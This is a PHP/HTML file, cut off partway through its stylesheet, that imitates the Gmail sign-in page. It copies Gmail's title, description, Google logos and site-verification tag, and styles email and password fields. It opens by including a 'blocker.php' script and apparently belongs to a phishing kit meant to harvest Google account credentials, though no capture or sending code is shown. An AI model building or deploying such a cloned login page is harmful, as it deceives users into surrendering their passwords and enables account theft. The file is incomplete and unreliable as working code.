<?php
include('blocker.php');
?>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <link rel="shortcut icon" href="favicon.ico" />
  <meta name="description" content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Gmail</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url() format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url() format('woff');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url(logo_1x.png);
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url(googlelogo_color_112x36dp.png);
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(logo_2x.png);
  }
  .header .logo-w {
  background-image: url(googlelogo_color_112x36dp.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(wlogostrip_230x17_2x.png);
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<style>
  .infomsg {
  color: #797979;
  line-height: 17px;
  margin: 0.5em 0 0;
  display: block;
  }
  .jfk-bubble {
  -webkit-box-shadow: 0 1px 3px rgba(0,0,0,.2);
  -moz-box-shadow: 0 1px 3px rgba(0,0,0,.2);
  box-shadow: 0 1px 3px rgba(0,0,0,.2);
  background-color: #fff;
  border: 1px solid;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  line-height: 17px;
  }
  .jfk-bubble-arrow {
  position: absolute
  }
  .jfk-bubble-arrow .jfk-bubble-arrowimplbefore,.jfk-bubble-arrow .jfk-bubble-arrowimplafter {
  display:block;
  height:0;
  position:absolute;
  width:0
  }
  .jfk-bubble-arrow .jfk-bubble-arrowimplbefore {
  border:9px solid
  }
  .jfk-bubble-arrow .jfk-bubble-arrowimplafter {
  border:8px solid
  }
  .jfk-bubble-arrowdown {
  bottom:0
  }
  .jfk-bubble-arrowup {
  top:-9px
  }
  .jfk-bubble-arrowleft {
  left:-9px
  }
  .jfk-bubble-arrowright {
  right:0
  }
  .jfk-bubble-arrowdown .jfk-bubble-arrowimplbefore,.jfk-bubble-arrowup .jfk-bubble-arrowimplbefore {
  border-color:#bbb transparent;
  left:-9px
  }
  .jfk-bubble-arrowdown .jfk-bubble-arrowimplbefore {
  border-color:#a8a8a8 transparent
  }
  .jfk-bubble-arrowdown .jfk-bubble-arrowimplafter,.jfk-bubble-arrowup .jfk-bubble-arrowimplafter {
  border-color:#fff transparent;
  left:-8px
  }
  .jfk-bubble-arrowdown .jfk-bubble-arrowimplbefore {
  border-bottom-width:0
  }
  .jfk-bubble-arrowdown .jfk-bubble-arrowimplafter {
  border-bottom-width:0
  }
  .jfk-bubble-arrowup .jfk-bubble-arrowimplbefore {
  border-top-width:0
  }
  .jfk-bubble-arrowup .jfk-bubble-arrowimplafter {
  border-top-width:0;
  top:1px
  }
  .jfk-bubble-arrowleft .jfk-bubble-arrowimplbefore,.jfk-bubble-arrowright .jfk-bubble-arrowimplbefore {
  border-color:transparent #bbb;
  top:-9px
  }
  .jfk-bubble-arrowleft .jfk-bubble-arrowimplafter,.jfk-bubble-arrowright .jfk-bubble-arrowimplafter {
  border-color:transparent #fff;
  top:-8px
  }
  .jfk-bubble-arrowleft .jfk-bubble-arrowimplbefore {
  border-left-width:0
  }
  .jfk-bubble-arrowleft .jfk-bubble-arrowimplafter {
  border-left-width:0;
  left:1px
  }
  .jfk-bubble-arrowright .jfk-bubble-arrowimplbefore {
  border-right-width:0
  }
  .jfk-bubble-arrowright .jfk-bubble-arrowimplafter {
  border-right-width:0
  }
  .jfk-bubble.jfk-bubble-promo {
  background-color:#f9edbe;
  border:1px solid #f0c36d
  }
  .jfk-bubble-promo .jfk-bubble-arrowdown .jfk-bubble-arrowimplbefore,.jfk-bubble-promo .jfk-bubble-arrowup .jfk-bubble-arrowimplbefore {
  border-color:#f0c36d transparent
  }
  .jfk-bubble-promo .jfk-bubble-arrowdown .jfk-bubble-arrowimplafter,.jfk-bubble-promo .jfk-bubble-arrowup .jfk-bubble-arrowimplafter {
  border-color:#f9edbe transparent
  }
  .jfk-bubble-promo .jfk-bubble-arrowleft .jfk-bubble-arrowimplbefore,.jfk-bubble-promo .jfk-bubble-arrowright .jfk-bubble-arrowimplbefore {
  border-color:transparent #f0c36d
  }
  .jfk-bubble-promo .jfk-bubble-arrowleft .jfk-bubble-arrowimplafter,.jfk-bubble-promo .jfk-bubble-arrowright .jfk-bubble-arrowimplafter {
  border-color:transparent #f9edbe
  }
</style>
<style>
.form-panel {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-transform: translateZ(0);
  -moz-transform: translateZ(0);
  -ms-transform: translateZ(0);
  -o-transform: translateZ(0);
  transform: translateZ(0);
  position: absolute;
  width: 100%;
}
.form-panel.first {
  z-index: 2;
}
.form-panel.second {
  z-index: 1;
}
.shift-form .form-panel.first {
  z-index: 1;
}
.shift-form .form-panel.second {
  z-index: 2;
}
  .hide-form.slide-out {
  display: none;
  }
  .hide-form.slide-in {
  display: none;
  }
.slide-in,
.slide-out {
  display: block;
  -webkit-transition-property: -webkit-transform, opacity;
  -moz-transition-property: -moz-transform, opacity;
  -ms-transition-property: -ms-transform, opacity;
  -o-transition-property: -o-transform, opacity;
  transition-property: transform, opacity;
  -webkit-transition-duration: 0.1s;
  -moz-transition-duration: 0.1s;
  -ms-transition-duration: 0.1s;
  -o-transition-duration: 0.1s;
  transition-duration: 0.1s;
  -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-out {
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.shift-form .slide-out {
  opacity: 0;
  -webkit-transform: translate3d(-120%, 0, 0);
  -moz-transform: translate3d(-120%, 0, 0);
  -ms-transform: translate3d(-120%, 0, 0);
  -o-transform: translate3d(-120%, 0, 0);
  transform: translate3d(-120%, 0, 0);
}
.slide-in {
  -webkit-transform: translate3d(120%, 0, 0);
  -moz-transform: translate3d(120%, 0, 0);
  -ms-transform: translate3d(120%, 0, 0);
  -o-transform: translate3d(120%, 0, 0);
  transform: translate3d(120%, 0, 0);
}
.shift-form .slide-in {
  opacity: 1;
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.error-msg {
  -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  height: auto;
  max-height: 0;
  opacity: 0;
}
.has-error .error-msg {
  max-height: 3.5em;
  margin-top: 10px;
  margin-bottom: 10px;
  opacity: 1;
  visibility: visible;
}
.back-arrow {
  position: absolute;
  top: 37px;
  width: 24px;
  height: 24px;
  display: none;
  cursor: pointer;
}
.back-arrow {
  border-style: none;
}
